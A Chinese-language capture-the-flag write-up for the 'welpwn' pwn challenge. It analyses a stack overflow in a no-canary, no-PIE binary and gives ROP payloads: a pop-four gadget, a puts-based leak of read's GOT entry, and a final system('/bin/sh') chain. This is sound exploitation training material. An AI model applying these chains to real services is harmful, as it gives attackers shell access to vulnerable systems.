# welpwn

题目来源：https://adworld.xctf.org.cn/task/

这道题目其实也是一道泄露 libc 的缓冲区溢出题，但是很可惜我有一个点没有注意，结果导致卡了很长时间，下面分享一下这道题的做法，先看一下这道题的防护：

```
Arch:     amd64-64-little                                            
RELRO:    Partial RELRO                                                    
Stack:    No canary found                                                  
NX:       NX enabled                                          
PIE:      No PIE (0x400000)
```

没有 canary 没有 PIE，说明很有可能存在缓冲区溢出并可以构造 ROP 攻击，程序代码如下：

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [rsp+0h] [rbp-400h]

  write(1, "Welcome to RCTF\n", 0x10uLL);
  fflush(_bss_start);
  read(0, &buf, 0x400uLL);
  echo((__int64)&buf);
  return 0;
}

int __fastcall echo(__int64 a1)
{
  char s2[16]; // [rsp+10h] [rbp-10h]

  for ( i = 0; *(_BYTE *)(i + a1); ++i )
    s2[i] = *(_BYTE *)(i + a1);
  s2[i] = 0;
  if ( !strcmp("ROIS", s2) )
  {
    printf("RCTF{Welcome}", s2);
    puts(" is not flag");
  }
  return printf("%s", s2);
}
```

代码很简短，main 中并没有有关溢出的漏洞，而 echo 中对于字符串的复制没有考虑道字符串的边界，所以出现了溢出，而溢出的字符串和 main 中输入的有关。

那么这道题没有提供有关 system 的函数，也没有给出 libc，所以考虑泄露 libc 的地址。下面是一开始构造的字符串：

```
'a'*0x18 + p64(pop_rdi) + p64(read_got) + p64(puts_plt) + p64(main_addr)
```

但是试过了，不行。理论上这个字符串的功能上是没有什么问题的，但是这道题有一个小细节，就是在 echo 中复制字符串的时候，终止的条件是碰到 0x00 就停止，而假设复制的是地址字段，地址的高位必然存在 0x00，那么该字符串只能成功复制其中的 1 个地址字段，后面的地址就不会出现在栈中。

但是这道题的栈帧设计的很巧妙，main 函数中的 buf 部分的底部正好紧贴 echo 的返回地址，这个可以直接观察栈的分配情况。这样可以细致地发现，输入的字符串也同样出现在 main 中 buf 的底部，只要跳过 4 个 8 字节数据就可以访问到了，所以这里需要先 pop 四下，还好在 gadget 中正好有这样的指令：

```
0x000000000040089c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
```

这个 gadget 正好符合要求。所以构造如下字符串：

```
'a'*0x18 + p64(pop4) + p64(pop_rdi) + p64(read_got) + p64(puts_plt) + p64(main_addr)
```

这样能够顺利拿到 read 函数的真实地址，而只需要使用 LibcSearcher 构造目标字符串就可以了：

```
'a'*0x18 + p64(pop4) + p64(pop_rdi) + p64(sh_addr) + p64(system)
```

